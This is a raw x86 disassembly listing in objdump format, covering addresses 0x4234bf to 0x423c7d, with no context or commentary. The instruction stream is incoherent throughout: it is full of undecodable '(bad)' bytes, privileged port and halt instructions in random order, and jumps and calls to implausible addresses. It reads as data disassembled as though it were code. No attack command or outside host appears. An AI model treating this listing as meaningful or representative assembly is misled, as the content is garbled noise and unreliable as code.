  4234bf:	adc    dl,bl
  4234c1:	ret    
  4234c2:	adc    edi,DWORD PTR [edx+edi*1+0x1a0d110a]
  4234c9:	inc    eax
  4234ca:	rcr    dl,cl
  4234cc:	jno    0x42354a
  4234ce:	hlt    
  4234cf:	shr    dh,cl
  4234d1:	stos   BYTE PTR es:[edi],al
  4234d2:	or     esp,DWORD PTR [ebx+0x61]
  4234d5:	sbb    ebx,edx
  4234d7:	mov    dl,0xed
  4234d9:	(bad)  
  4234da:	shl    BYTE PTR [eax+0x55a2ea6c],cl
  4234e0:	mov    ecx,0x5fa52106
  4234e5:	test   eax,0x4ed1c228
  4234ea:	sbb    al,BYTE PTR [ecx]
  4234ec:	cdq    
  4234ed:	xchg   edi,eax
  4234ee:	mov    eax,0xe1ed1b9a
  4234f3:	mov    ds:0x542d10e9,eax
  4234f8:	cwde   
  4234f9:	loope  0x423514
  4234fb:	test   BYTE PTR [ecx],0x2b
  4234fe:	fist   WORD PTR [ecx-0x34538194]
  423504:	jge    0x4234eb
  423506:	into   
  423507:	arpl   WORD PTR [esi+0x3e643468],si
  42350d:	dec    eax
  42350e:	xor    al,0xc1
  423510:	push   ebp
  423511:	enter  0xdd40,0xbc
  423515:	push   ebp
  423516:	(bad)  [ecx]
  423518:	push   ecx
  423519:	and    eax,0x68a554fd
  42351e:	or     BYTE PTR [ebp+0x7f6bbc7d],bl
  423524:	inc    ecx
  423525:	aad    0xd0
  423527:	add    eax,0xd9e68024
  42352c:	dec    ebx
  42352d:	pop    es
  42352e:	(bad)  
  423530:	shl    DWORD PTR [ecx],0x6
  423533:	push   ss
  423534:	aam    0x1c
  423536:	jnp    0x423581
  423538:	inc    ecx
  423539:	push   ebx
  42353a:	adc    al,0x78
  42353c:	repnz mov ebx,0x1519af59
  423542:	dec    ebx
  423543:	and    al,0xd3
  423545:	sbb    eax,0xd750b60
  42354a:	cli    
  42354b:	lea    ebp,[edi]
  42354d:	add    al,0x31
  42354f:	pop    es
  423550:	das    
  423551:	dec    eax
  423552:	fldcw  WORD PTR [ebx+0x14]
  423555:	xor    al,0xb8
  423557:	imul   esp
  423559:	xchg   ebp,eax
  42355a:	jnp    0x4235aa
  42355c:	into   
  42355d:	aas    
  42355e:	jne    0x4234ea
  423560:	test   DWORD PTR [eax-0x3e3c96a9],edx
  423566:	jne    0x423595
  423568:	add    ch,dl
  42356a:	add    al,0xa1
  42356c:	pop    ecx
  42356d:	fnclex 
  42356f:	bound  ecx,QWORD PTR [eax+0x4db18e3f]
  423575:	mov    ecx,0xf89e43e5
  42357a:	push   edi
  42357b:	in     eax,dx
  42357c:	or     al,0x2d
  42357e:	and    dl,dh
  423580:	jmp    0x423531
  423582:	inc    ecx
  423583:	jo     0x4235ef
  423585:	push   eax
  423586:	and    eax,0xe7757ed8
  42358b:	sahf   
  42358c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42358d:	pusha  
  42358e:	movd   DWORD PTR [esi+0x7a],mm0
  423592:	aas    
  423593:	sbb    BYTE PTR [eax+0x5a],0xd
  423597:	pop    es
  423598:	or     esp,ebx
  42359a:	pushf  
  42359b:	bound  ecx,QWORD PTR [edi-0x69]
  42359e:	mov    edi,0x128c80fe
  4235a3:	cmc    
  4235a4:	jae    0x4235ee
  4235a6:	mov    eax,0xbb909be0
  4235ab:	push   es
  4235ac:	test   al,0x14
  4235ae:	add    eax,0x936bdfcf
  4235b3:	dec    eax
  4235b4:	inc    ebx
  4235b5:	ins    BYTE PTR es:[edi],dx
  4235b6:	cli    
  4235b7:	fdivrp st(1),st
  4235b9:	(bad)  
  4235ba:	mov    eax,0x2f49d69d
  4235bf:	jecxz  0x423632
  4235c1:	outs   dx,DWORD PTR ds:[esi]
  4235c2:	cmp    eax,0x1e5708d4
  4235c7:	out    0xd0,eax
  4235c9:	fld    TBYTE PTR [edi+0x3fdb14d8]
  4235cf:	add    al,0x93
  4235d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235d2:	pop    ecx
  4235d3:	mov    edx,0x72c60966
  4235d8:	retf   0x173d
  4235db:	cmp    BYTE PTR [edi+ecx*4],bl
  4235de:	add    DWORD PTR [edi+0x40],edx
  4235e1:	push   ebp
  4235e2:	add    al,0x79
  4235e4:	or     al,0x15
  4235e6:	gs xchg edx,eax
  4235e8:	fdivr  st(1),st
  4235ea:	jmp    0xacc7:0x6c2ee4e1
  4235f1:	mov    bh,dh
  4235f3:	(bad)  
  4235f4:	lahf   
  4235f5:	lods   al,BYTE PTR ds:[esi]
  4235f6:	pop    ebx
  4235f7:	daa    
  4235f8:	dec    edx
  4235f9:	push   esi
  4235fa:	stos   BYTE PTR es:[edi],al
  4235fb:	xor    edx,eax
  4235fd:	pop    ebp
  4235fe:	enter  0xae51,0x93
  423602:	in     al,0x18
  423604:	ss dec esp
  423606:	repz or ebp,esp
  423609:	mov    al,0xa2
  42360b:	mov    dl,0xb7
  42360d:	mov    edi,0xc561df3d
  423612:	add    eax,0xe5381c34
  423617:	enter  0x9c9f,0x73
  42361b:	push   esi
  42361c:	int    0xa3
  42361e:	dec    esp
  42361f:	enter  0xe0ab,0xaf
  423623:	loop   0x4235b8
  423625:	adc    al,0xd8
  423627:	xor    BYTE PTR [ecx],dl
  423629:	int    0x0
  42362b:	inc    esp
  42362c:	cs in  al,dx
  42362e:	pop    ecx
  42362f:	std    
  423630:	sub    bh,ch
  423632:	or     al,0x28
  423634:	mov    dl,0xbb
  423636:	mov    ch,0x7a
  423638:	pop    ds
  423639:	add    al,0xc7
  42363b:	xor    al,0x7a
  42363d:	push   ds
  42363e:	ficomp DWORD PTR [edi-0x51d565ff]
  423644:	push   ebp
  423645:	loopne 0x4236b8
  423647:	inc    esi
  423648:	cmp    DWORD PTR [esi+0x65302ab4],edx
  42364e:	pop    edx
  42364f:	out    0x7a,eax
  423651:	xor    ch,BYTE PTR [ebp+0x76838d93]
  423657:	fcom   QWORD PTR [edi-0x6b4069cc]
  42365d:	cmp    eax,0x1fd60f0c
  423662:	repz and eax,0x72f98af7
  423668:	mov    ds:0x5dd61e46,eax
  42366d:	call   0xde4dcfb7
  423672:	mov    ebx,0x2bfa8e63
  423677:	ja     0x42366d
  423679:	leave  
  42367a:	dec    esp
  42367b:	inc    eax
  42367c:	popf   
  42367d:	std    
  42367e:	mul    BYTE PTR [ebp-0x14]
  423681:	dec    eax
  423682:	test   ebx,ecx
  423684:	fsub   st(1),st
  423686:	adc    DWORD PTR [esi*8+0x2439807b],edx
  42368d:	push   ebp
  42368e:	les    ebx,FWORD PTR [edx-0x674622f3]
  423694:	xchg   edx,eax
  423695:	mov    ah,0xef
  423697:	or     esi,esp
  423699:	sbb    edx,DWORD PTR [esi+0x60]
  42369c:	push   eax
  42369d:	push   ecx
  42369e:	sub    ebp,DWORD PTR [ebx-0x46]
  4236a1:	dec    eax
  4236a2:	mov    ebp,0x22389443
  4236a7:	mov    dl,BYTE PTR [esi+eiz*8]
  4236aa:	in     eax,0x47
  4236ac:	mov    ebx,0x40049da3
  4236b1:	pop    ds
  4236b2:	sbb    eax,0xee73a114
  4236b7:	dec    ebx
  4236b8:	or     eax,0x1a9e395c
  4236bd:	push   edx
  4236be:	jnp    0x423692
  4236c0:	das    
  4236c1:	fstp   QWORD PTR [eax-0x3a]
  4236c4:	xchg   ebx,eax
  4236c5:	jb     0x4236ad
  4236c7:	ret    0xdc98
  4236ca:	retf   0x49d5
  4236cd:	cmp    al,0xe9
  4236cf:	push   es
  4236d0:	pusha  
  4236d1:	and    eax,0xfb89bb2b
  4236d6:	push   0x46128519
  4236db:	xor    bl,BYTE PTR [eax]
  4236dd:	popa   
  4236de:	stos   BYTE PTR es:[edi],al
  4236df:	push   eax
  4236e0:	mov    eax,ds:0x37ba3d7c
  4236e5:	(bad)  
  4236e6:	push   eax
  4236e7:	mov    BYTE PTR [eax],dl
  4236e9:	push   edi
  4236ea:	xlat   BYTE PTR ds:[ebx]
  4236eb:	add    eax,0x29dbeb1f
  4236f0:	daa    
  4236f1:	or     BYTE PTR [edi],0xfe
  4236f4:	push   edi
  4236f5:	or     al,0x75
  4236f7:	and    al,BYTE PTR [ebx-0x51]
  4236fa:	shl    BYTE PTR [ebx+0x7ef64245],0xdd
  423701:	or     esi,0x6fbf9f20
  423707:	hlt    
  423708:	jmp    0xc7de:0x622a63c9
  42370f:	xor    eax,0xd397587f
  423714:	ror    DWORD PTR [edi-0x22],0x99
  423718:	in     eax,dx
  423719:	fs jae 0x4236c6
  42371c:	mov    ch,0x5f
  42371e:	sbb    eax,0x3cd0175e
  423723:	(bad)
  423727:	je     0x42377a
  423729:	(bad)  
  42372a:	call   0x6bd28030
  42372f:	jmp    0x42370e
  423731:	pop    ebx
  423732:	js     0x42374a
  423734:	xor    ch,BYTE PTR [ebp-0x7d]
  423737:	cdq    
  423738:	jl     0x423731
  42373a:	ret    
  42373b:	pop    eax
  42373c:	out    dx,eax
  42373d:	xor    cl,BYTE PTR [edi-0x65]
  423740:	sub    al,0xc5
  423742:	in     eax,0xc7
  423744:	xor    ch,cl
  423746:	cwde   
  423747:	push   esi
  423748:	sub    cl,ch
  42374a:	shl    BYTE PTR [ebp-0x7807d820],0xf2
  423751:	lods   al,BYTE PTR ds:[esi]
  423752:	pushf  
  423753:	fld    DWORD PTR [ecx]
  423755:	sbb    BYTE PTR [eax+0x6e1242ed],ah
  42375b:	or     BYTE PTR [edx],dl
  42375d:	(bad)  
  42375e:	or     bh,al
  423760:	nop
  423761:	mov    ch,0x9f
  423763:	cmp    al,0x94
  423765:	xchg   ebx,eax
  423766:	push   esp
  423767:	sbb    BYTE PTR [edi+0x457074dd],bh
  42376d:	leave  
  42376e:	pop    ecx
  42376f:	fcmovbe st,st(4)
  423771:	dec    eax
  423772:	in     al,0xe
  423774:	rol    BYTE PTR [edx+edx*4-0x6a5058e2],1
  42377b:	fnsave [edx-0x45]
  42377e:	call   0x6ebd57db
  423783:	jne    0x423730
  423785:	dec    esp
  423786:	push   ecx
  423787:	mov    ch,0x1e
  423789:	pop    edx
  42378a:	pop    esi
  42378b:	sbb    ah,dh
  42378d:	dec    edi
  42378e:	mov    edi,0x2d7072d6
  423793:	pop    esi
  423794:	cmp    bh,al
  423796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423797:	cld    
  423798:	pop    es
  423799:	add    DWORD PTR [eax],ecx
  42379b:	clc    
  42379c:	mov    cl,0x3e
  42379e:	and    al,0x12
  4237a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237a1:	adc    al,0x54
  4237a3:	jb     0x423734
  4237a5:	jnp    0x423772
  4237a7:	mov    edx,0x5ce4828e
  4237ac:	lods   al,BYTE PTR ds:[esi]
  4237ad:	sbb    ebp,DWORD PTR [esi-0x5240e2ae]
  4237b3:	add    bl,bh
  4237b5:	add    DWORD PTR [eax+0x17],edi
  4237b8:	or     DWORD PTR [ebx+0x24],edx
  4237bb:	aad    0x9c
  4237bd:	push   0xffffff96
  4237bf:	mov    WORD PTR [eax],ds
  4237c1:	jns    0x423787
  4237c3:	pop    ss
  4237c4:	cmp    DWORD PTR [edx],esi
  4237c6:	aas    
  4237c7:	add    DWORD PTR [ecx-0x2575bc86],edx
  4237cd:	xchg   DWORD PTR [ecx+0x1b],edi
  4237d0:	dec    eax
  4237d1:	mov    eax,ds:0x80fba5e2
  4237d6:	aam    0xdd
  4237d8:	jae    0x423846
  4237da:	push   ecx
  4237db:	cmp    BYTE PTR [ebp-0x1b574955],al
  4237e1:	sub    eax,DWORD PTR [ebp+0x3bf8ccc1]
  4237e7:	inc    ebx
  4237e8:	mul    BYTE PTR [ebx+0x1d0df8c0]
  4237ee:	cmp    bh,BYTE PTR [ebx-0x36]
  4237f1:	es sub eax,0x4813b20c
  4237f7:	push   esi
  4237f8:	je     0x42383a
  4237fa:	sub    edx,DWORD PTR [eax]
  4237fc:	lods   eax,DWORD PTR ds:[esi]
  4237fd:	push   ebp
  4237fe:	mov    dl,0x5a
  423800:	sbb    cl,BYTE PTR [edx+0x28e21158]
  423806:	dec    eax
  423807:	or     esp,DWORD PTR ds:0x68470c77
  42380d:	jg     0x4237e0
  42380f:	es pop esi
  423811:	dec    ebp
  423812:	js     0x42387c
  423814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423815:	(bad)
  423819:	xor    edx,DWORD PTR [eax-0x40]
  42381c:	jnp    0x423800
  42381e:	scas   eax,DWORD PTR es:[edi]
  42381f:	sbb    edx,DWORD PTR [edi]
  423821:	popa   
  423822:	retf   
  423823:	aas    
  423824:	loope  0x42384a
  423826:	repz mov ah,0x4a
  423829:	adc    esi,ebx
  42382b:	ret    
  42382c:	pop    DWORD PTR [eax-0x679bddaa]
  423832:	icebp  
  423833:	mov    ah,0x1b
  423835:	lock add edx,DWORD PTR [ebp+ecx*1+0x5a4030b9]
  42383d:	imul   edi,DWORD PTR [edx],0xef5133fd
  423843:	jns    0x4237f8
  423845:	add    ch,bh
  423847:	adc    bh,BYTE PTR [edx-0x16]
  42384a:	mov    ebx,0xcf294aa7
  42384f:	mov    ds:0x104ad1d9,eax
  423854:	add    DWORD PTR [ebp+0x6],ecx
  423857:	cmp    esi,DWORD PTR [eax+0x7a]
  42385a:	cmc    
  42385b:	pusha  
  42385c:	mov    cl,0xa3
  42385e:	dec    esi
  42385f:	stc    
  423860:	hlt    
  423861:	adc    esi,DWORD PTR [ebx+0x3443fa5d]
  423867:	cmp    ecx,DWORD PTR [edi]
  423869:	push   ebp
  42386a:	shl    DWORD PTR [esi+0x3b],1
  42386d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42386e:	dec    ebp
  42386f:	ja     0x423863
  423871:	inc    edx
  423872:	data16 xor al,0x7d
  423875:	cmp    al,0xf7
  423877:	xchg   ebp,eax
  423878:	retf   
  423879:	or     ebx,DWORD PTR [edi+0x11dd1010]
  42387f:	cwde   
  423880:	mov    cl,0x2b
  423882:	mov    al,bh
  423884:	pop    eax
  423885:	jbe    0x4238b8
  423887:	inc    ebx
  423888:	inc    eax
  423889:	and    esi,DWORD PTR gs:[esi+edi*1]
  42388d:	jmp    0xb71374e0
  423892:	pusha  
  423893:	cld    
  423894:	inc    edx
  423895:	mov    al,ds:0x970b34f2
  42389a:	mov    al,0x66
  42389c:	loopne 0x4238e3
  42389e:	xchg   esp,eax
  42389f:	jne    0x4238c0
  4238a1:	or     edi,edx
  4238a3:	and    ebp,DWORD PTR [esi-0x2e896831]
  4238a9:	shr    DWORD PTR [ebp+ebx*2+0x75],0xa8
  4238ae:	ss push 0x74e79a46
  4238b4:	cmp    bl,BYTE PTR [edi-0x1]
  4238b7:	xor    BYTE PTR [edx+0x300d57d3],dl
  4238bd:	clc    
  4238be:	cld    
  4238bf:	adc    al,0x59
  4238c1:	imul   edi,DWORD PTR [edi],0x1a
  4238c4:	lahf   
  4238c5:	jbe    0x423879
  4238c7:	jne    0x3b2b8f4
  4238cd:	xor    al,0xf1
  4238cf:	push   esp
  4238d0:	repz cld 
  4238d2:	mov    ebx,0x1dc7277f
  4238d7:	jecxz  0x42385d
  4238d9:	cli    
  4238da:	mov    cl,0x9f
  4238dc:	and    al,0xdf
  4238de:	mov    edx,0x16c1a116
  4238e3:	sbb    ecx,eax
  4238e5:	imul   eax,DWORD PTR [edi+0x4d],0xfb006f4f
  4238ec:	dec    ebp
  4238ed:	stos   BYTE PTR es:[edi],al
  4238ee:	add    al,0xb1
  4238f0:	sbb    edi,DWORD PTR [edi+0x3636debd]
  4238f6:	aaa    
  4238f7:	add    DWORD PTR [edx+0x74],ebx
  4238fa:	push   ebx
  4238fb:	or     BYTE PTR [esi-0x4c4cf107],bh
  423901:	add    al,0xa6
  423903:	jb     0x423953
  423905:	push   edi
  423906:	pushf  
  423907:	add    DWORD PTR [esi],edi
  423909:	icebp  
  42390a:	sub    BYTE PTR [esi+esi*4+0x70],ah
  42390e:	adc    bh,bh
  423910:	(bad)  
  423911:	lods   al,BYTE PTR ds:[esi]
  423912:	and    DWORD PTR ds:0x590a294,eax
  423918:	xchg   ebx,eax
  423919:	je     0x423940
  42391b:	in     eax,dx
  42391c:	push   edi
  42391d:	int    0x2a
  42391f:	int3   
  423920:	pop    esi
  423921:	mov    ah,0xc8
  423923:	adc    ebx,esp
  423925:	(bad)  
  423926:	or     eax,ecx
  423928:	loopne 0x4238bb
  42392a:	dec    ecx
  42392b:	loopne 0x4238de
  42392d:	push   cs
  42392e:	or     edx,DWORD PTR ds:0x5a0343f3
  423934:	arpl   bx,si
  423936:	inc    ebx
  423937:	imul   BYTE PTR [edx+0x2]
  42393a:	mov    BYTE PTR [edx-0x4c],0x2
  42393e:	ror    al,cl
  423940:	xchg   edx,eax
  423941:	outs   dx,BYTE PTR ds:[esi]
  423942:	mov    ebx,eax
  423944:	stos   BYTE PTR es:[edi],al
  423945:	test   al,0x61
  423947:	xor    eax,0xdb76d004
  42394c:	add    BYTE PTR [edi-0x23],0x1e
  423950:	cmp    al,0x62
  423952:	aaa    
  423953:	and    eax,DWORD PTR [edi]
  423955:	icebp  
  423956:	dec    esp
  423957:	fsubr  QWORD PTR [esi-0x41]
  42395a:	mov    ebx,0xac61a62e
  42395f:	fcmovbe st,st(4)
  423961:	sub    eax,0x407143b6
  423966:	lock sbb ecx,DWORD PTR [esi-0x75]
  42396a:	jb     0x423991
  42396c:	in     al,0x10
  42396e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42396f:	xor    esi,DWORD PTR [edx+edi*4-0x1b]
  423973:	and    eax,0x26387577
  423978:	inc    edx
  423979:	ds jns 0x423995
  42397c:	call   0x85fe6607
  423981:	jns    0x42399b
  423983:	mov    al,0x77
  423985:	jp     0x42396c
  423987:	aaa    
  423988:	jge    0x4239fc
  42398a:	iret   
  42398b:	jb     0x4239bf
  42398d:	jmp    0x7fddeb80
  423992:	cmp    DWORD PTR [ecx],0x8
  423995:	dec    esi
  423996:	or     eax,0xaa20bc84
  42399b:	in     eax,dx
  42399c:	fldcw  WORD PTR [edx+0x16bea7f6]
  4239a2:	and    BYTE PTR [esi+0x436c3c99],dh
  4239a8:	xchg   DWORD PTR [edx],edi
  4239aa:	xchg   BYTE PTR [esi-0x4757e854],dl
  4239b0:	imul   edx,DWORD PTR [ebx-0x5363a264],0x9b55532c
  4239ba:	pop    edx
  4239bb:	fcmovne st,st(5)
  4239bd:	ds jecxz 0x4239f9
  4239c0:	jno    0x423996
  4239c2:	pop    es
  4239c3:	(bad)  
  4239c5:	jp     0x42395b
  4239c7:	cmp    al,0xe7
  4239c9:	ja     0x423a0e
  4239cb:	popf   
  4239cc:	in     eax,0x94
  4239ce:	ficom  WORD PTR [esi+0xf59e8ab]
  4239d4:	push   esp
  4239d5:	(bad)  
  4239d7:	push   ebp
  4239d8:	loope  0x423970
  4239da:	sub    eax,0x322d656f
  4239df:	outs   dx,DWORD PTR ds:[esi]
  4239e0:	inc    esi
  4239e1:	bound  eax,QWORD PTR [edi-0x766c3334]
  4239e7:	sti    
  4239e8:	adc    esi,DWORD PTR [ebp-0x19da1f2d]
  4239ee:	loop   0x423a59
  4239f0:	iret   
  4239f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239f2:	and    DWORD PTR [edi+0x74],esi
  4239f5:	cmp    DWORD PTR [esi+0x15e8c4e5],esi
  4239fb:	cs pop esi
  4239fd:	ss or  al,0xbf
  423a00:	mov    cl,BYTE PTR [eax]
  423a02:	pushf  
  423a03:	loope  0x4239ff
  423a05:	repnz push eax
  423a07:	aam    0x5f
  423a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a0a:	popa   
  423a0b:	pop    ebx
  423a0c:	jg     0x4239ea
  423a0e:	inc    ebp
  423a0f:	aaa    
  423a10:	enter  0xf0d2,0x90
  423a14:	sub    edi,DWORD PTR [edi]
  423a16:	sub    al,0x2d
  423a18:	retf   
  423a19:	lock fnstsw WORD PTR ds:[esi+eiz*4]
  423a1e:	in     eax,dx
  423a1f:	sbb    BYTE PTR [ecx+0x4f],dh
  423a22:	and    eax,0xc0b4b750
  423a27:	fwait
  423a28:	ds push es
  423a2a:	retf   0x181e
  423a2d:	jns    0x4239f6
  423a2f:	fcomp  DWORD PTR [ebp-0x50]
  423a32:	sbb    ecx,ebp
  423a34:	or     eax,DWORD PTR [eax]
  423a36:	or     eax,0x6c0ea15
  423a3b:	push   0xffffffc0
  423a3d:	in     eax,dx
  423a3e:	clc    
  423a3f:	sub    al,0xe5
  423a41:	add    ebx,DWORD PTR [ebp-0x26]
  423a44:	arpl   WORD PTR [edi-0x2d],ax
  423a47:	repnz loope 0x423a6a
  423a4a:	mov    al,ds:0xd7e805ac
  423a4f:	aaa    
  423a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a51:	xchg   BYTE PTR [edx-0x2946e62c],al
  423a57:	arpl   WORD PTR [ebp+0x4656889f],dx
  423a5d:	pop    eax
  423a5e:	scas   eax,DWORD PTR es:[edi]
  423a5f:	sub    DWORD PTR [eax-0x25],0xc1ff7719
  423a66:	add    DWORD PTR [ebx+ebx*1-0x37875f36],0x930a6ff0
  423a71:	mov    ds:0x8cbb0fb6,al
  423a76:	popa   
  423a77:	xor    BYTE PTR [edx+edx*1],dl
  423a7a:	and    ch,ch
  423a7c:	test   BYTE PTR es:0x1046f840,bh
  423a83:	fld    QWORD PTR [edx-0x2cfd2cab]
  423a89:	mov    BYTE PTR [ebp-0x527db575],al
  423a8f:	pushf  
  423a90:	outs   dx,DWORD PTR ds:[esi]
  423a91:	jae    0x423a60
  423a93:	mov    eax,ds:0x2fa0459c
  423a98:	aad    0xaf
  423a9a:	jo     0x423a56
  423a9c:	and    BYTE PTR [ebp+0x52144d9d],bh
  423aa2:	xor    edi,esp
  423aa4:	pop    esi
  423aa5:	movaps xmm3,XMMWORD PTR [esi-0x27]
  423aa9:	fcmovnb st,st(1)
  423aab:	add    bl,BYTE PTR [edi-0x1b]
  423aae:	push   ebx
  423aaf:	into   
  423ab0:	rol    bh,1
  423ab2:	mov    esi,0x636c9f48
  423ab7:	and    BYTE PTR [edi-0x6ed86a51],bh
  423abd:	test   eax,0xb5375b32
  423ac2:	dec    ecx
  423ac3:	(bad)  
  423ac4:	dec    ebp
  423ac5:	adc    BYTE PTR [ecx+0x24],ch
  423ac8:	(bad)  
  423ac9:	cwde   
  423aca:	and    DWORD PTR [ebx],eax
  423acc:	push   esi
  423acd:	dec    esi
  423ace:	inc    esi
  423acf:	add    esp,ebx
  423ad1:	test   DWORD PTR [ecx+0x46],esi
  423ad4:	es daa 
  423ad6:	out    0x48,eax
  423ad8:	push   esp
  423ad9:	lods   al,BYTE PTR ds:[esi]
  423ada:	mov    ds:0x8b571deb,eax
  423adf:	iret   
  423ae0:	jno    0x423b33
  423ae2:	pop    ds
  423ae3:	push   ds
  423ae4:	outs   dx,BYTE PTR ds:[esi]
  423ae5:	pop    ecx
  423ae6:	pusha  
  423ae7:	(bad)  
  423ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ae9:	jb     0x423ae3
  423aeb:	xchg   ecx,eax
  423aec:	add    eax,0xe28195c6
  423af1:	xor    BYTE PTR [ebp+ebx*1+0x44],ah
  423af5:	or     DWORD PTR [ebx+ecx*2-0x49eefc55],esp
  423afc:	repnz neg DWORD PTR [ecx-0x5d1de496]
  423b03:	gs test al,0x7c
  423b06:	xchg   edx,eax
  423b07:	mov    dh,0x25
  423b09:	in     al,dx
  423b0a:	scas   al,BYTE PTR es:[edi]
  423b0b:	add    BYTE PTR [ecx-0x15],0xf2
  423b0f:	test   DWORD PTR [ebp+0x14],edx
  423b12:	xchg   ebp,eax
  423b13:	mov    ebp,0x4a7500ba
  423b18:	cmp    eax,0xf5eae5b7
  423b1d:	push   esi
  423b1e:	push   ecx
  423b1f:	add    ah,BYTE PTR [ecx+ebp*1-0xecb795d]
  423b26:	stos   BYTE PTR es:[edi],al
  423b27:	jecxz  0x423b4a
  423b29:	sub    esp,edi
  423b2b:	sar    DWORD PTR [edi],1
  423b2d:	loopne 0x423ae0
  423b2f:	and    BYTE PTR [edx+0x473a4f84],dh
  423b35:	aam    0x80
  423b37:	dec    ebx
  423b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b39:	sub    BYTE PTR [esi],ch
  423b3b:	pop    ebx
  423b3c:	jle    0x423b71
  423b3e:	mov    bl,0x2c
  423b40:	mov    ecx,0x8f34add0
  423b45:	outs   dx,BYTE PTR ds:[esi]
  423b46:	inc    ecx
  423b47:	pop    edx
  423b48:	xchg   edi,eax
  423b49:	fdivr  st,st(4)
  423b4b:	sub    al,0x0
  423b4d:	mov    esp,0xb1b1a321
  423b52:	out    dx,eax
  423b53:	sub    edx,0x23
  423b56:	gs jle 0x423b48
  423b59:	gs cmp eax,0xdc20933b
  423b5f:	retf   0xd6b9
  423b62:	and    dh,BYTE PTR [ecx-0x757f713a]
  423b68:	mov    BYTE PTR [ebx-0x6b],0x6b
  423b6c:	aad    0xaf
  423b6e:	in     eax,dx
  423b6f:	nop
  423b70:	xchg   ebp,eax
  423b71:	inc    eax
  423b72:	rcr    BYTE PTR [edi+0x50],cl
  423b75:	or     BYTE PTR [esi],dl
  423b77:	arpl   WORD PTR [ebx+esi*8-0x7f9756a1],dx
  423b7e:	xchg   ebx,eax
  423b7f:	xchg   edx,eax
  423b80:	add    bl,ch
  423b82:	mov    ch,0xae
  423b84:	and    edi,DWORD PTR [ebp-0x10871e05]
  423b8a:	in     eax,dx
  423b8b:	jnp    0x423bf3
  423b8d:	jp     0x423b18
  423b8f:	mov    edi,0xad93d40f
  423b94:	and    DWORD PTR [eax],ebx
  423b96:	jns    0x423b37
  423b98:	pop    eax
  423b99:	ja     0x423c0a
  423b9b:	xor    edx,DWORD PTR [esi+0xd]
  423b9e:	popf   
  423b9f:	dec    esp
  423ba0:	jb     0x423b46
  423ba2:	(bad)  
  423ba3:	aad    0x99
  423ba5:	pop    ebx
  423ba6:	mov    dl,0x70
  423ba8:	test   dh,dh
  423baa:	push   ss
  423bab:	mov    esi,0x4003c6f5
  423bb0:	stos   DWORD PTR es:[edi],eax
  423bb1:	add    dl,BYTE PTR [ebx]
  423bb3:	dec    esp
  423bb4:	aas    
  423bb5:	int    0xa8
  423bb7:	ss adc eax,0x1e239de9
  423bbd:	stos   DWORD PTR es:[edi],eax
  423bbe:	dec    esi
  423bbf:	retf   
  423bc0:	cld    
  423bc1:	gs sbb dh,dh
  423bc4:	pushf  
  423bc5:	xchg   ebx,eax
  423bc6:	aad    0xf7
  423bc8:	in     al,dx
  423bc9:	(bad)  
  423bca:	mov    eax,0x5787a63c
  423bcf:	dec    eax
  423bd0:	popf   
  423bd1:	nop
  423bd2:	pop    esi
  423bd3:	outs   dx,BYTE PTR ds:[esi]
  423bd4:	out    0xd5,al
  423bd6:	add    DWORD PTR [ecx],ecx
  423bd8:	cmp    eax,0x8360695e
  423bdd:	aam    0x1c
  423bdf:	fiadd  WORD PTR [ebx+0x688f7b9c]
  423be5:	ja     0x423bff
  423be7:	xor    DWORD PTR [esi-0x2135ac38],0x69
  423bee:	and    bh,cl
  423bf0:	mov    dh,0x3a
  423bf2:	call   0x31078146
  423bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bf8:	ds pop eax
  423bfa:	push   ebx
  423bfb:	jle    0x423c35
  423bfd:	jg     0x423c0f
  423bff:	gs repz aaa 
  423c02:	in     al,dx
  423c03:	(bad)
  423c06:	clc    
  423c07:	out    0x79,al
  423c09:	mov    DWORD PTR [ebx],eax
  423c0b:	mov    esi,DWORD PTR [ecx]
  423c0d:	je     0x423c42
  423c0f:	cdq    
  423c10:	jl     0x423c7e
  423c12:	add    ebp,DWORD PTR [ecx+0x14]
  423c15:	lods   al,BYTE PTR ds:[esi]
  423c16:	(bad)
  423c19:	cli    
  423c1a:	shl    DWORD PTR [edx],0x1
  423c1d:	daa    
  423c1e:	stos   BYTE PTR es:[edi],al
  423c1f:	out    dx,al
  423c20:	mov    cl,0xd2
  423c22:	lods   al,BYTE PTR ds:[esi]
  423c23:	and    al,0x8
  423c25:	out    0x2d,eax
  423c27:	or     al,0x1
  423c29:	mov    bh,0x17
  423c2b:	aad    0xfe
  423c2d:	inc    ecx
  423c2e:	out    dx,eax
  423c2f:	repnz outs dx,BYTE PTR ds:[esi]
  423c31:	dec    edi
  423c32:	mov    cl,BYTE PTR [ebp+0x4a]
  423c35:	pop    es
  423c36:	dec    edi
  423c37:	cmp    edi,DWORD PTR [ebp-0x26]
  423c3a:	in     al,0x2a
  423c3c:	jbe    0x423c0b
  423c3e:	hlt    
  423c3f:	mov    ecx,0x83554ec7
  423c44:	clc    
  423c45:	dec    ebp
  423c46:	sub    ch,BYTE PTR [edi]
  423c48:	jmp    0xd2db3d24
  423c4d:	or     ecx,esp
  423c4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c50:	and    eax,0xb0586a55
  423c55:	jg     0x423c12
  423c57:	test   DWORD PTR [ecx+ebx*2],edi
  423c5a:	and    BYTE PTR [ebx-0x48],dh
  423c5d:	data16 mov ds:0xdabd4465,al
  423c63:	sbb    BYTE PTR [ecx+0x20],bh
  423c66:	lods   eax,DWORD PTR ds:[esi]
  423c67:	jbe    0x423c09
  423c69:	aas    
  423c6a:	icebp  
  423c6b:	repz cmp edi,DWORD PTR [edi]
  423c6e:	mov    WORD PTR [edi+eax*8],ss
  423c71:	pop    ebx
  423c72:	adc    dh,bl
  423c74:	or     al,cl
  423c76:	mov    ebx,0xba349d68
  423c7b:	add    edx,DWORD PTR [esi]
  423c7d:	inc    eax
